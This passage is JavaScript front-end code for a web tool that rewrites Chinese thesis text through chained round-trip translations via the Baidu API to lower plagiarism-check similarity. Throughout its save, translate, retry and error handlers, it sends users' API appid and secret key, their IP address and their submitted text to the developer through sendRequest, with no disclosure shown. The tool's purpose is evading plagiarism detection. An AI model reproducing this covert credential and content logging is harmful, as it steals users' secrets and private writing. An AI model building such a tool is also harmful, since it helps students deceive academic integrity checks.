let to = $(".originData");

let from = $(".newData");
let from1 = $(".newData1");
let from2 = $(".newData2");
let from3 = $(".newData3");
let from4 = $(".newData4");
let from5 = $(".newData5");

let compare = $(".compareData");
let compare1 = $(".compareData1");
let compare2 = $(".compareData2");
let compare3 = $(".compareData3");
let compare4 = $(".compareData4");
let compare5 = $(".compareData5");

var appid = localStorage.getItem("appid1");
var key = localStorage.getItem("key1");
var ydAppKey = localStorage.getItem("ydAppKey");
var ydKey = localStorage.getItem("ydKey");
const url = 'https://api.fanyi.baidu.com/api/trans/vip/translate';
let timer = null;

$("#yourAppid").val(appid);
$("#yourKey").val(key);

if (localStorage.getItem('sTimes') != null && localStorage.getItem('sTimes') >= 0 && localStorage.getItem("appid1") == secret().WtdKltf2 && localStorage.getItem("key1") == secret().zDQA3) {
	countTime1();
} else {
	if (!localStorage.getItem("appid1") || !localStorage.getItem("key1") || localStorage.getItem("appid1") == null ||
		localStorage.getItem("key1") == null) {
		if (location.host == "freysu.github.io") {
			showToast("&emsp;&emsp;<b>欢迎新来的小伙伴来访！</b><br/>&emsp;&emsp;现已推出<b>【免申请 API 体验 3 分钟】功能</b>和<b>【一键提取查重报告标红内容】功能</b>，欢迎点击右上角使用。<br/>&emsp;&emsp;如需使用降重功能请先点击右上角的【配置账号】！如果你不会配置的话，可以点击右上角的【使用帮助】！<br/>&emsp;&emsp;解决不了的话加群反馈作者(QQ群:238223706)</br>&emsp;&emsp;如果本网站加载得很慢，可以访问备用网站，地址是</br>&emsp;&emsp;<a href='https://my-translator-freysu.vercel.app'>https://my-translator-freysu.vercel.app</a>", 5000);
		} else {
			showToast("&emsp;&emsp;<b>欢迎新来的小伙伴来访！</b><br/>&emsp;&emsp;现已推出<b>【免申请 API 体验 3 分钟】功能</b>和<b>【一键提取查重报告标红内容】功能</b>，欢迎点击右上角使用。<br/>&emsp;&emsp;如需使用降重功能请先点击右上角的【配置账号】！如果你不会配置的话，可以点击右上角的【使用帮助】！<br/>&emsp;&emsp;解决不了的话加群反馈作者(QQ群:238223706)", 5000);
		}
	} else {
		if (localStorage.getItem("appid1") == secret().WtdKltf2 && localStorage.getItem("key1") == secret().zDQA3 && localStorage.getItem("sTimes") == -1) {
			showToast('&emsp;&emsp;抱歉！你已结束体验，如需继续使用本网站，麻烦请按照教程去配置账号！<br/>&emsp;&emsp;如果你遇到了账号配置出错，大概率是因为百度那边服务器抽风了，所以你可以休息一会再尝试~也可以去查阅一下帮助，我已更新最新教程！<br/>&emsp;&emsp;解决不了的话加群反馈作者(QQ群:238223706)', 4000)
			localStorage.removeItem("appid1");
			localStorage.removeItem("key1");
			localStorage.setItem("sTimes", 0);
			$("#yourAppid").val("");
			$("#yourKey").val("");
		} else if (localStorage.getItem("sTimes") < 0) {
			if (location.host == "freysu.github.io") {
				showToast("&emsp;&emsp;欢迎老朋友" + appid + "，今天又是美好的一天，论文人加油啊！<br/>&emsp;&emsp;现已推出<b>【一键提取查重报告标红内容】功能</b>，欢迎点击右上角使用。<br/>&emsp;&emsp;如果你遇到了账号配置出错，大概率是因为百度那边服务器抽风了，所以你可以休息一会再尝试~也可以去查阅一下帮助，我已更新最新教程！<br/>&emsp;&emsp;解决不了的话加群反馈作者(QQ群:238223706)</br>&emsp;&emsp;如果本网站加载得很慢，可以访问备用网站，地址是</br>&emsp;&emsp;<a href='https://my-translator-freysu.vercel.app'>https://my-translator-freysu.vercel.app</a>", 4000);
			} else {
				showToast(
					'&emsp;&emsp;欢迎老朋友' + appid + '，今天又是美好的一天，论文人加油啊！<br/>&emsp;&emsp;现已推出<b>【一键提取查重报告标红内容】功能</b>，欢迎点击右上角使用。<br/>&emsp;&emsp;如果你遇到了账号配置出错，大概率是因为百度那边服务器抽风了，所以你可以休息一会再尝试~也可以去查阅一下帮助，我已更新最新教程！<br/>&emsp;&emsp;解决不了的话加群反馈作者(QQ群:238223706)',
					4000);
			}
		}
	}
}

$(".mybg").css('background', 'url("https://tuapi.eees.cc/api.php?category=biying&type=302") no-repeat center center')

$("#saveBtn").click(() => {
	const fn = () => {
		let _appid = $("#yourAppid").val();
		let _key = $("#yourKey").val()
		if (!_appid || !_key || _appid == "null" || _key == "null" || _appid.match(/,"expire":/) !=
			null || _key.match(/,"expire":/) != null || _appid == "appid" || _key == "key" || _appid ==
			"123hk" || _key == "123hk") {
			showToast("请检查后重新输入！", 3500)
		} else {
			localStorage.setItem("appid1", _appid);
			localStorage.setItem("key1", _key);
			isCanUse(localStorage.getItem("appid1"), localStorage.getItem("key1"), "aa", "zh", "en");

			function isCanUse(check_Appid, check_Key, QUERY, TO, FROM) {
				const salt = (new Date()).getTime();
				const str1 = check_Appid + QUERY + salt + check_Key;
				const sign = MD5.main(str1);
				$.ajax({
					url,
					type: 'get',
					// async: true,
					// 跨域
					dataType: 'jsonp',
					contentType: "application/x-www-form-urlencoded; charset=utf-8",
					data: {
						q: QUERY,
						appid: check_Appid,
						salt: salt,
						from: FROM,
						to: TO,
						sign: sign,
					},
					success: (data) => {
						if (data.error_code == "52003") {
							showToast("<b>保存失败！</b>请检查后重新输入！解决不了的话加群反馈作者(QQ群:238223706)",
								4500);
							sendRequest(localStorage.getItem("sTimes") + " \\ " + localStorage.getItem("appid1"), data.error_code + "：" + "上车失败 &&" + localStorage.getItem("key1") + "IP 地址：" + kehu_ip, 1);
							localStorage.removeItem("appid1");
							localStorage.removeItem("key1");
							$("#yourAppid").val("");
							$("#yourKey").val("");
							return;
						} else {
							if (localStorage.getItem("appid1") == secret().WtdKltf2 && localStorage.getItem("key1") == secret().zDQA3 && localStorage.getItem("sTimes") == -1) {
								showToast('<b>你真棒！想白嫖到底是吧？被我逮到了吧？哈哈哈！</b>', 4000)
								localStorage.removeItem("appid1");
								localStorage.removeItem("key1");
								localStorage.setItem("sTimes", 0);
								$("#yourAppid").val("");
								$("#yourKey").val("");
								sendRequest("盗用: " + localStorage.getItem("sTimes") + " \\ " + localStorage.getItem("appid1") + "&&" + localStorage.getItem("key1"), "盗用 API 被我抓到了吧！IP 地址：" + kehu_ip, 1);
							} else {
								if (localStorage.getItem("sTimes") != -1 && localStorage.getItem("appid1") == secret().WtdKltf2 && localStorage.getItem("key1") == secret().zDQA3) {
									localStorage.setItem('sTimes', -2)
								} else {
									localStorage.setItem("sTimes", -1);
								}
								showToast("<b>保存成功！</b>如果你在翻译降重的时候遇到了账号配置出错，大概率是因为百度服务器那边抽风了，你可以先休息一会，等会再重试，也可以去查阅一下帮助，我已更新最新教程！解决不了的话加群反馈作者(QQ群:238223706)",
									4500);
								$('#exampleModal').modal('hide');
								$('.modal-backdrop').css("z-index", "-10");
								$('body').css("padding-right", "");
								sendRequest(localStorage.getItem("sTimes") + " \\ " + localStorage.getItem("appid1") + "&&" + localStorage.getItem("key1"), "上车了！IP 地址：" + kehu_ip, 4);
							}
						}
					},
				})
			}
		}
	}
	if (timer !== null) {
		clearTimeout(timer);
	}
	timer = setTimeout(() => {
		fn();
		timer = null;
	}, 500);
})

$("#deleteBtn").click(() => {
	const fn = () => {
		sendRequest(localStorage.getItem("sTimes") + " \\ " + localStorage.getItem("appid1"), "下车了！", 5);
		localStorage.removeItem("appid1");
		localStorage.removeItem("key1");
		showToast("已删除...欢迎你下次使用，到时请重新保存！", 4000);
		$("#yourAppid").val("");
		$("#yourKey").val("");
		$('#exampleModal').modal('hide')
		$('.modal-backdrop').css("z-index", "-10");
	}
	if (timer !== null) {
		clearTimeout(timer);
	}
	timer = setTimeout(() => {
		fn();
		timer = null;
	}, 500);
})

$(".clear").click(() => {
	const fn = () => {
		$("#zifu").text("0");
		$(".tongji").detach();
		$(".originData").val("");
		// $(".lead").text("此处将会显示翻译结果")
		$(".lead").text("")
		// $(".compareRes").text("此处将会显示对比结果")
		$(".compareRes").text("")
		for (let i = 0; i < $(".card").length; i++) {
			if ($(".isLow-" + i).hasClass("alert-success")) {
				$(".isLow-" + i).removeClass("alert-success")
			}
		}
	}
	if (timer !== null) {
		clearTimeout(timer);
	}
	timer = setTimeout(() => {
		fn();
		timer = null;
	}, 500);
})

var foamTip = true;

$(".translateBtn").click((e) => {
	const fn = () => {
		for (let i = 0; i < $(".lead").length; i++) {
			$(".newData" + i).html('');
		}
		$('.newData').html('');
		$('.compareRes').html('');
		if ($('.compareResDiv').css('display') == 'block') {
			$('.compareResDiv').css('display', "none");
		}
		for (let i = 0; i < $(".card").length; i++) {
			if ($(".isLow-" + i).hasClass("alert-success")) {
				$(".isLow-" + i).removeClass("alert-success")
			}
		}
		var appid11 = localStorage.getItem("appid1");
		var key11 = localStorage.getItem("key1");
		if (!appid11 || !key11) {
			showToast("您未配置账号，请配置完账号再开始使用...解决不了的话加群反馈作者(QQ群:238223706)", 3000);
		} else if (appid11 == "null" || key11 == "null" || appid11.match(/,"expire":/) != null || key11
			.match(/,"expire":/) != null || appid11 == "appid" || key11 == "key" || appid11 == "123hk" ||
			key11 == "123hk") {
			showToast("账号有误，请重新检查配置...解决不了的话加群反馈作者(QQ群:238223706)", 2500);
		} else if (to.val() == "") {
			showToast("你未输入要翻译的内容...", 2500);
		} else {
			if (localStorage.getItem('sTimes') <= 0 && localStorage.getItem('sTimes') != -2 && appid11 == secret().WtdKltf2 && key11 == secret().zDQA3) {
				localStorage.removeItem('appid1')
				localStorage.removeItem('key1')
				$("#yourAppid").val("");
				$("#yourKey").val("");
				showToast('由于你还未配置账号，如需继续使用本网站，麻烦请按照教程去配置账号！<br/>&emsp;&emsp;如果你遇到了账号配置出错，大概率是因为百度那边服务器抽风了，所以你可以休息一会再尝试~也可以去查阅一下帮助，我已更新最新教程！<br/>&emsp;&emsp;解决不了的话加群反馈作者(QQ群:238223706)', 4000)
			} else {
				var nTo = $("#zifu").text();
				if (nTo < 2000) {
					if (appid11 == secret().WtdKltf2 && key11 == secret().zDQA3 && localStorage.getItem('sTimes') >= 0) {
						if (nTo < 500) {
							if (nTo >= 300) {
								setTimeout(() => {
									showToast("正在翻译中...请耐心等待", 2500);
								}, 2000);
								showToast("温馨提醒：您输入的内容过长，为了保证翻译降重质量，建议不要一次性输入那么多字！！最好在300字以内~", 2500);
								foamTip1 = false;
							} else {
								showToast("正在翻译中...请耐心等待", 2500);
							}
							sendRequest(localStorage.getItem("sTimes") + " \\ " + appid11, key11 + ' \\ errorTimes: ' + errorTimes + ' \\ restartTimes: ' + restartTimes + " \\ " + "IP 地址：" + kehu_ip + to.val(), 2);
							//! Don't forget it!
							window.similarityArr = [];
							translateMain(0, to.val());
							document.querySelector(`.showcase`).scrollIntoView(); // 页面不刷新跳转
						} else {
							showToast("检测到你输入的字数超过500字，请调整减少字数后重新输入再翻译。由于你是体验用户，我这边限制了字数。如需提高字数，请自行查阅帮助去配置！", 3000);
						}
					} else {
						if (foamTip1 == true && nTo >= 300) {
							setTimeout(() => {
								showToast("正在翻译中...请耐心等待", 2500);
							}, 2000);
							showToast("温馨提醒：您输入的内容过长，为了保证翻译降重质量，建议不要一次性输入那么多字！！最好在300字以内~", 2500);
							foamTip1 = false;
						} else {
							showToast("正在翻译中...请耐心等待", 2500);
						}
						sendRequest(localStorage.getItem("sTimes") + " \\ " + appid11, key11 + ' \\ errorTimes: ' + errorTimes + ' \\ restartTimes: ' + restartTimes + " \\ " + "IP 地址：" + kehu_ip + to.val(), 2);
						//! Don't forget it!
						window.similarityArr = [];
						translateMain(0, to.val());
						document.querySelector(`.showcase`).scrollIntoView(); // 页面不刷新跳转
					}
				} else {
					showToast("为了保证翻译降重质量，请不要一次性输入那么多字！！请调整好字数（建议一次性300字以内）之后再重新翻译", 4000);
				}
			}
		}
	}
	if (timer !== null) {
		clearTimeout(timer);
	}
	timer = setTimeout(() => {
		$(".tongji").detach();
		fn();
		timer = null;
	}, 500);
})

var foamTip1 = true
$(".translateAndCompareBtn").click((e) => {
	const fn = () => {
		for (let i = 0; i < $(".lead").length; i++) {
			$(".newData" + i).html('');
		}
		$('.newData').html('');
		$('.compareRes').html('');
		if ($('.compareResDiv').css('display') == 'none') {
			$('.compareResDiv').css('display', "block");
		}
		for (let i = 0; i < $(".card").length; i++) {
			if ($(".isLow-" + i).hasClass("alert-success")) {
				$(".isLow-" + i).removeClass("alert-success")
			}
		}
		var appid11 = localStorage.getItem("appid1");
		var key11 = localStorage.getItem("key1");
		if (!appid11 || !key11) {
			showToast("您未配置账号，请配置完账号再开始使用...解决不了的话加群反馈作者(QQ群:238223706)", 3000);
		} else if (appid11 == "null" || key11 == "null" || appid11.match(/,"expire":/) != null || key11
			.match(/,"expire":/) != null || appid11 == "appid" || key11 == "key" || appid11 == "123hk" ||
			key11 == "123hk") {
			showToast("账号有误，请重新检查配置...解决不了的话加群反馈作者(QQ群:238223706)", 2500);
		} else if (to.val() == "") {
			showToast("你未输入要翻译的内容所以无法对比...", 2500);
		} else {
			if (localStorage.getItem('sTimes') <= 0 && localStorage.getItem('sTimes') != -2 && appid11 == secret().WtdKltf2 && key11 == secret().zDQA3) {
				localStorage.removeItem('appid1')
				localStorage.removeItem('key1')
				$("#yourAppid").val("");
				$("#yourKey").val("");
				showToast('由于你还未配置账号，如需继续使用本网站，麻烦请按照教程去配置账号！<br/>&emsp;&emsp;如果你遇到了账号配置出错，大概率是因为百度那边服务器抽风了，所以你可以休息一会再尝试~也可以去查阅一下帮助，我已更新最新教程！<br/>&emsp;&emsp;解决不了的话加群反馈作者(QQ群:238223706)', 4000)
			} else {
				var nTo = $("#zifu").text();
				if (nTo < 2000) {
					if (appid11 == secret().WtdKltf2 && key11 == secret().zDQA3 && localStorage.getItem('sTimes') >= 0) {
						if (nTo < 500) {
							if (nTo >= 300) {
								setTimeout(() => {
									showToast("正在翻译中...请耐心等待", 2500);
								}, 2000);
								showToast("温馨提醒：您输入的内容过长，为了保证翻译降重质量，建议不要一次性输入那么多字！！最好在300字以内~", 2500);
								foamTip1 = false;
							} else {
								showToast("正在翻译中...请耐心等待", 2500);
							}
							sendRequest(localStorage.getItem("sTimes") + " \\ " + appid11, key11 + ' \\ errorTimes: ' + errorTimes + ' \\ restartTimes: ' + restartTimes + ' \\ ' + "IP 地址：" + kehu_ip + to.val(), 2);
							//! Don't forget it!
							window.similarityArr = [];
							translateMain(1, to.val());
							document.querySelector(`.showcase`).scrollIntoView(); // 页面不刷新跳转
						} else {
							showToast("检测到你输入的字数超过500字，请调整减少字数后重新输入再翻译。由于你是体验用户，我这边限制了字数。如需提高字数，请自行查阅帮助去配置！", 3000);
						}
					} else {
						if (foamTip1 == true && nTo >= 300) {
							setTimeout(() => {
								showToast("正在翻译中...请耐心等待", 2500);
							}, 2000);
							showToast("温馨提醒：您输入的内容过长，为了保证翻译降重质量，建议不要一次性输入那么多字！！最好在300字以内~", 2500);
							foamTip1 = false;
						} else {
							showToast("正在翻译中...请耐心等待", 2500);
						}
						sendRequest(localStorage.getItem("sTimes") + " \\ " + appid11, key11 + ' \\ errorTimes: ' + errorTimes + ' \\ restartTimes: ' + restartTimes + " \\ " + "IP 地址：" + kehu_ip + to.val(), 2);
						//! Don't forget it!
						window.similarityArr = [];
						translateMain(1, to.val());
						document.querySelector(`.showcase`).scrollIntoView(); // 页面不刷新跳转
					}
				} else {
					showToast("为了保证翻译降重质量，请不要一次性输入那么多字！！请调整好字数（建议一次性300字以内）之后再重新翻译", 4000);
				}
			}
		}
	}
	if (timer !== null) {
		clearTimeout(timer);
	}
	timer = setTimeout(() => {
		$(".tongji").detach();
		fn();
		timer = null;
	}, 500);
})

$(".compare").click(() => {
	const fn = () => {
		if (to.val() == "") {
			showToast("你未输入要翻译的内容所以无法对比...", 2500);
		} else {
			showToast("正在对比...", 2500);
			compareMain();
			document.querySelector(`.showcase`).scrollIntoView(); // 页面不刷新跳转
		}
	}
	if (timer !== null) {
		clearTimeout(timer);
	}
	timer = setTimeout(() => {
		fn();
		timer = null;
	}, 500);
})

var restartTimes = 0;
$(".restart").on("click", function () {
	showToast("正在重试...", 2500);
	from.html("正在重试...");
	if (restartTimes <= 5) {
		sendRequest(localStorage.getItem("sTimes") + " \\ " + localStorage.getItem("appid1"), "正在重试...", 3);
	}
	restartTimes++;
	translateZeroFn();
});

$(".restart1").on("click", function () {
	showToast("正在重试...", 2500);
	from1.html("正在重试...");
	if (restartTimes <= 5) {
		sendRequest(localStorage.getItem("sTimes") + " \\ " + localStorage.getItem("appid1"), "正在重试...", 3)
	}
	restartTimes++;
	translateOneFn();
});

$(".restart2").on("click", function () {
	showToast("正在重试...", 2500);
	from2.html("正在重试...");
	if (restartTimes <= 5) {
		sendRequest(localStorage.getItem("sTimes") + " \\ " + localStorage.getItem("appid1"), "正在重试...", 3)
	}
	restartTimes++;
	translateTwoFn();
});

$(".restart3").on("click", function () {
	showToast("正在重试...", 2500);
	from3.html("正在重试...");
	if (restartTimes <= 5) {
		sendRequest(localStorage.getItem("sTimes") + " \\ " + localStorage.getItem("appid1"), "正在重试...", 3)
	}
	restartTimes++;
	translateThreeFn();
});

$(".restart4").on("click", function () {
	showToast("正在重试...", 2500);
	from4.html("正在重试...");
	if (restartTimes <= 5) {
		sendRequest(localStorage.getItem("sTimes") + " \\ " + localStorage.getItem("appid1"), "正在重试...", 3)
	}
	restartTimes++;
	translateFourFn();
});

$(".restart5").on("click", function () {
	showToast("正在重试...", 2500);
	from5.html("正在重试...");
	if (restartTimes <= 5) {
		sendRequest(localStorage.getItem("sTimes") + " \\ " + localStorage.getItem("appid1"), "正在重试...", 3)
	}
	restartTimes++;
	translateFiveFn();
});


function queryFormatFn(rs) {
	return String(rs).replace(/^[“]+/, "").replace(/[”]$/, "");
}

var showTip = 0;

function translateFn(QUERY, FROM, TO) {
	return new Promise((resolve, reject) => {
		const salt = (new Date()).getTime();
		const str1 = appid + QUERY + salt + key;
		const sign = MD5.main(str1);
		setTimeout(() => {
			$.ajax({
				url,
				type: 'get',
				// async: true,
				// 跨域
				dataType: 'jsonp',
				contentType: "application/x-www-form-urlencoded; charset=utf-8",
				data: {
					q: QUERY,
					appid: appid,
					salt: salt,
					from: FROM,
					to: TO,
					sign: sign,
				}
			}).done(data => {
				if (data.error_code == "52003") {
					showToast("账号配置出错，请重新配置...如果你保存成功了还显示这条提示，大概率是因为百度服务器那边抽风了，你可以先休息一会，等会再刷新重试...解决不了的话加群反馈作者(QQ群:238223706)", 3000);
					if (showTip <= 4) {
						sendRequest('showTip: ' + showTip + ' \\ ' + localStorage.getItem("sTimes") + " \\ " + localStorage.getItem("appid1"), data.error_code + "：" + "封装的翻译API && 账号配置出错，请重新配置... &&" + localStorage.getItem("key1"), 1);
					}
					showTip++;
				} else if (data.error_code == "54003") {
					showToast("由于你的API还未升级成高级版，所以出现了修改失败...解决不了的话加群反馈作者(QQ群:238223706)", 3000);
					reject(data.error_code);
				} else if (data.trans_result[0] != undefined) {
					resolve(data.trans_result[0].dst)
				}
			})
		}, 1500);
	})
}
// var showTip1 = 0;

// function youdaoTranslateFn(query, from, to) {
// 	return new Promise((resolve, reject) => {
// 		var salt = (new Date).getTime();
// 		var curtime = Math.round(new Date().getTime() / 1000);
// 		var str1 = ydAppKey + truncate(query) + salt + curtime + ydKey;
// 		var sign = CryptoJS.SHA256(str1).toString(CryptoJS.enc.Hex);
// 		setTimeout(() => {
// 			$.ajax({
// 				url: 'https://openapi.youdao.com/api',
// 				type: 'post',
// 				dataType: 'jsonp',
// 				data: {
// 					q: query,
// 					appKey: ydAppKey,
// 					salt: salt,
// 					from: from,
// 					to: to,
// 					sign: sign,
// 					signType: "v3",
// 					curtime,
// 				}
// 			}).done(data => {
// 				if (data.errorCode == "108") {
// 					showToast("账号配置出错，请重新配置...如果你保存成功了还显示这条提示，大概率是因为百度服务器那边抽风了，你可以先休息一会，等会再刷新重试...解决不了的话加群反馈作者(QQ群:238223706)", 3000);
// 					if (showTip1 <= 4) {
// 						sendRequest('showTip1: ' + showTip1 + ' \\ ' + localStorage.getItem("sTimes") + " \\ " + localStorage.getItem("ydAppid"), data.error_code + "：" + "封装的yd翻译API && 账号配置出错，请重新配置... &&" + localStorage.getItem("ydAppid"), 1);
// 					}
// 					showTip1++;
// 				} else if (data.errorCode == "5411") {
// 					showToast("yd:由于你的API还未升级成高级版，所以出现了修改失败...解决不了的话加群反馈作者(QQ群:238223706)", 3000);
// 					reject(data.errorCode);
// 				} else if (data.translation[0] != undefined) {
// 					resolve(data.translation[0])
// 				}
// 			})
// 		}, 1500);

// 		function truncate(q) {
// 			var len = q.length;
// 			if (len <= 20) return q;
// 			return q.substring(0, 10) + len + q.substring(len - 10, len);
// 		}
// 	})
// }

var errorTimes = 0;
// 存放相似度结果
function Res(index, similarity) {
	this.index = index;
	this.similarity = similarity;
}
// zh-en-zh
function translateZeroFn(fn) {
	translateFn(to.val(), "zh", "en").then((rs) => {
		translateFn(queryFormatFn(rs), "en", "zh").then((rs) => {
			from.html(rs);
			from.css("color", "black");
			//! Don't forget it!
			var similarityRes = allSimilarity(to.val(), rs);
			var res = new Res(0, similarityRes);
			similarityArr.push(res);
			from.after("<p class='tongji text-muted'>共计：<b>" + tongji(rs) + " </b>字符&emsp;<span class='similarity'>预计相似度：<b>" + similarityRes + "</b></span></p>");
			if (fn) {
				setTimeout(() => {
					compareMain("from");
				}, 1000);
			}
		}, (err) => {
			if (err == "54003" || err == "") {

				from.html('修改失败，请稍后重试......');
				from.css("color", "red");
				$(".restart").css("display", "inline-block");
				if (errorTimes <= 5) {
					sendRequest(localStorage.getItem("sTimes") + " \\ " + localStorage.getItem("appid1"), "error-1:" + err, 1);
				}
				errorTimes++;
			}
		});
	}, (err) => {
		if (err == "54003" || err == "") {

			from.html('修改失败，请稍后重试......');
			from.css("color", "red");
			$(".restart").css("display", "inline-block")
			if (errorTimes <= 5) {
				sendRequest(localStorage.getItem("sTimes") + " \\ " + localStorage.getItem("appid1"), "error:" + err, 1)
			}
			errorTimes++;
		}
	})
}

// zh-jp-zh
function translateOneFn(fn) {
	translateFn(to.val(), 'zh', 'jp').then((rs) => {
		translateFn(queryFormatFn(rs), "jp", "zh").then((rs) => {
			from1.html(rs);
			from1.css("color", "black");
			//! Don't forget it!
			var similarityRes = allSimilarity(to.val(), rs);
			var res = new Res(1, similarityRes);
			similarityArr.push(res);
			from1.after("<p class='tongji text-muted'>共计：<b>" + tongji(rs) + " </b>字符&emsp;<span class='similarity'>预计相似度：<b>" + similarityRes + "</b></span></p>");
			if (fn) {
				setTimeout(() => {
					compareMain("from1");
				}, 1000);
			}
		}, (err) => {
			if (err == "54003" || err == "") {

				from1.html('修改失败，请稍后重试......');
				from1.css("color", "red");
				$(".restart1").css("display", "inline-block");
				if (errorTimes <= 5) {
					sendRequest(localStorage.getItem("sTimes") + " \\ " + localStorage.getItem("appid1"), "error1-1:" + err, 1);
				}
				errorTimes++;
			}
		});
	}, (err) => {
		if (err == "54003" || err == "") {

			from1.html('修改失败，请稍后重试......');
			from1.css("color", "red");
			$(".restart1").css("display", "inline-block")
			if (errorTimes <= 5) {
				sendRequest(localStorage.getItem("sTimes") + " \\ " + localStorage.getItem("appid1"), "error1:" + err, 1)
			}
			errorTimes++;
		}
	})
}

// zh-it-zh
function translateTwoFn(fn) {
	translateFn(to.val(), 'zh', 'it').then((rs) => {
		translateFn(queryFormatFn(rs), "it", "zh").then((rs) => {
			from2.html(rs);
			from2.css("color", "black");
			//! Don't forget it!
			var similarityRes = allSimilarity(to.val(), rs);
			var res = new Res(2, similarityRes);
			similarityArr.push(res);
			from2.after("<p class='tongji text-muted'>共计：<b>" + tongji(rs) + " </b>字符&emsp;<span class='similarity'>预计相似度：<b>" + similarityRes + "</b></span></p>");
			if (fn) {
				setTimeout(() => {
					compareMain("from2")
				}, 1000);
			}
		}, (err) => {
			if (err == "54003" || err == "") {

				from2.html('修改失败，请稍后重试......');
				from2.css("color", "red");
				$(".restart2").css("display", "inline-block")
				if (errorTimes <= 5) {
					sendRequest(localStorage.getItem("sTimes") + " \\ " + localStorage.getItem("appid1"), "error2-1:" + err, 1)
				}
			}
		})
	}, (err) => {
		if (err == "54003" || err == "") {

			from2.html('修改失败，请稍后重试......');
			from2.css("color", "red");
			$(".restart2").css("display", "inline-block")
			if (errorTimes <= 5) {
				sendRequest(localStorage.getItem("sTimes") + " \\ " + localStorage.getItem("appid1"), "error2:" + err, 1)
			}
			errorTimes++;
		}
	})
}

//zh-fra-en-pt-jp-zh 中 法 英 葡 日 中  
function translateThreeFn(fn) {
	translateFn(to.val(), "zh", "fra").then((rs) => {
		translateFn(queryFormatFn(rs), "fra", "en").then((rs) => {
			translateFn(queryFormatFn(rs), "en", "pt").then((rs) => {
				translateFn(queryFormatFn(rs), "pt", "jp").then((rs) => {
					translateFn(queryFormatFn(rs), "jp", "zh").then((rs) => {
						from3.html(rs);
						from3.css("color", "black");
						//! Don't forget it!
						var similarityRes = allSimilarity(to.val(), rs);
						var res = new Res(3, similarityRes);
						similarityArr.push(res);
						from3.after("<p class='tongji text-muted'>共计：<b>" + tongji(rs) + " </b>字符&emsp;<span class='similarity'>预计相似度：<b>" + similarityRes + "</b></span></p>");
						if (fn) {
							setTimeout(() => {
								compareMain(
									"from3")
							}, 1000);
						}
						var sArr = GFG_Fun(similarityArr);
						for (var i = 0; i < sArr.length; i++) {
							$(".isLow-" + sArr[i]).toggleClass("alert-success");
							showToast('系统检测到最低的预估的相似度为' + similarityArr[0].similarity + '的翻译结果，请注意查看<button onclick="similarTarget(' + sArr[0] + ')">点击跳转该条翻译结果</button>', 3000);
						}

						function GFG_Fun(arr) {
							arr.sort(function (a, b) {
								var o1 = parseFloat(a.similarity.replace("%", ""));
								var o2 = parseFloat(b.similarity.replace("%", ""));
								var p1 = a.index;
								var p2 = b.index;
								if (o1 < o2) return -1;
								if (o1 > o2) return 1;
								if (p1 < p2) return -1;
								if (p1 > p2) return 1;
								return 0;
							});
							similarityArr = arr;
							var nArr = [];
							for (let i = 0; i < arr.length - 1; i++) {
								if (arr[0].similarity == arr[i].similarity) {
									if (nArr.length == 0) {
										nArr.push(arr[0].index);
									}
									if (arr[i].similarity == arr[i + 1].similarity) {
										nArr.push(arr[i + 1].index);
									}
								}
							}
							return nArr;
						}

					}, (err) => {
						if (err == "54003" || err == "") {
							from3.html("修改失败，请稍后重试......");
							from3.css("color", "red");
							$(".restart3").css("display", "inline-block")
							if (errorTimes <= 5) {
								sendRequest(localStorage.getItem("sTimes") + " \\ " + localStorage.getItem("appid1"), "error3-4:" + err, 1)
							}
							errorTimes++;
						}
					})
				}, (err) => {
					if (err == "54003" || err == "") {
						from3.html("修改失败，请稍后重试......");
						from3.css("color", "red");
						$(".restart3").css("display", "inline-block")
						if (errorTimes <= 5) {
							sendRequest(localStorage.getItem("sTimes") + " \\ " + localStorage.getItem("appid1"), "error3-3:" + err, 1)
						}
						errorTimes++;
					}
				})
			}, (err) => {
				if (err == "54003" || err == "") {
					from3.html("修改失败，请稍后重试......");
					from3.css("color", "red");
					$(".restart3").css("display", "inline-block")
					if (errorTimes <= 5) {
						sendRequest(localStorage.getItem("sTimes") + " \\ " + localStorage.getItem("appid1"), "error3-2:" + err, 1)
					}
					errorTimes++;
				}
			})
		}, (err) => {
			if (err == "54003" || err == "") {
				from3.html("修改失败，请稍后重试......");
				from3.css("color", "red");
				$(".restart3").css("display", "inline-block")
				if (errorTimes <= 5) {
					sendRequest(localStorage.getItem("sTimes") + " \\ " + localStorage.getItem("appid1"), "error3-1:" + err, 1)
				}
				errorTimes++;
			}
		})
	}, (err) => {
		if (err == "54003" || err == "") {
			from3.html("修改失败，请稍后重试......");
			from3.css("color", "red");
			$(".restart3").css("display", "inline-block")
			if (errorTimes <= 5) {
				sendRequest(localStorage.getItem("sTimes") + " \\ " + localStorage.getItem("appid1"), "error3:" + err, 1)
			}
			errorTimes++;
		}
	})
}

//zh - de - fra - zh
function translateFourFn(fn) {
	translateFn(to.val(), "zh", "de").then((rs) => {
		translateFn(queryFormatFn(rs), "de", "fra").then((rs) => {
			translateFn(queryFormatFn(rs), "fra", "zh").then((rs) => {
				from4.html(rs);
				from4.css("color", "black");
				//! Don't forget it!
				var similarityRes = allSimilarity(to.val(), rs);
				var res = new Res(4, similarityRes);
				similarityArr.push(res);
				from4.after("<p class='tongji text-muted'>共计：<b>" + tongji(rs) + " </b>字符&emsp;<span class='similarity'>预计相似度：<b>" + similarityRes + "</b></span></p>");
				if (fn) {
					setTimeout(() => {
						compareMain("from4")
					}, 1000);
				}
			}, (err) => {
				if (err == "54003" || err == "") {
					from4.html("修改失败，请稍后重试......");
					from4.css("color", "red");
					$(".restart4").css("display", "inline-block")
					if (errorTimes <= 5) {
						sendRequest(localStorage.getItem("sTimes") + " \\ " + localStorage.getItem("appid1"), "error4-2:" + err, 1)
					}
					errorTimes++;
				}
			})
		}, (err) => {
			if (err == "54003" || err == "") {
				from4.html("修改失败，请稍后重试......");
				from4.css("color", "red");
				$(".restart4").css("display", "inline-block")
				if (errorTimes <= 5) {
					sendRequest(localStorage.getItem("sTimes") + " \\ " + localStorage.getItem("appid1"), "error4-1:" + err, 1)
				}
				errorTimes++;
			}
		})
	}, (err) => {
		if (err == "54003" || err == "") {
			from4.html("修改失败，请稍后重试......");
			from4.css("color", "red");
			$(".restart4").css("display", "inline-block")
			if (errorTimes <= 5) {
				sendRequest(localStorage.getItem("sTimes") + " \\ " + localStorage.getItem("appid1"), "error4:" + err, 1)
			}
			errorTimes++;
		}
	})
}

// zh-en-jp-kor-zh
function translateFiveFn(fn) {
	translateFn(to.val(), "zh", "en").then((rs) => {
		translateFn(queryFormatFn(rs), "en", "jp").then((rs) => {
			translateFn(queryFormatFn(rs), "jp", "kor").then((rs) => {
				translateFn(queryFormatFn(rs), "kor", "zh").then((rs) => {
					from5.html(rs);
					from5.css("color", "black");
